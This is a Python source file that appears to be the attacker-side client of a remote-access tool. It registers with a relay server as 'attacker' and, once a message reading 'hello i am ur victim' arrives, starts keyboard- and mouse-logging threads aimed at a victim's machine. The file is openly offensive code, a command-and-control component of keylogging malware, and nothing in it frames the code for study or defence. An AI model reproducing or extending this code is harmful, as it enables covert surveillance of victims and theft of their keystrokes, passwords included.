from functions import *
from gui import *

ip_of_victim = ''
ip_of_server = ("192.168.1.211", 8200)


def parser(s: socket.socket):
    while True:
        data, ip = s.recvfrom(1024)
        data = data.decode()
        if data.startswith("additional_option"):
            data = data[17:]
            update_options(data)
        elif data.startswith("options"):
            data = data[7:]
            if data:
                for option in data.split('\n'):
                    update_options(option)
        elif data.startswith("hello i am ur victim"):
            F.ip = ip
            threading.Thread(target=log_keyboard, daemon=True).start()
            threading.Thread(target=log_mouse, daemon=True).start()
            destroy()


def main():
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    client.sendto("attacker".encode(), ip_of_server)
    threading.Thread(target=parser, args=(client,)).start()
    F.s = client
    D.s = client
    D.ip_of_server = ip_of_server
    msg = 'change'
    client.sendto("request_options".encode(), ip_of_server)
    init()
    while msg != "exit":
        print("exit or change: ")
        msg = input()
        if msg == 'change':
            client.sendto("request_options".encode(), ip_of_server)
            init()
        F.flag = False

    client.sendto("attacker exit".encode(), ip_of_server)
    time.sleep(1)
    client.close()


if __name__ == '__main__':
    main()
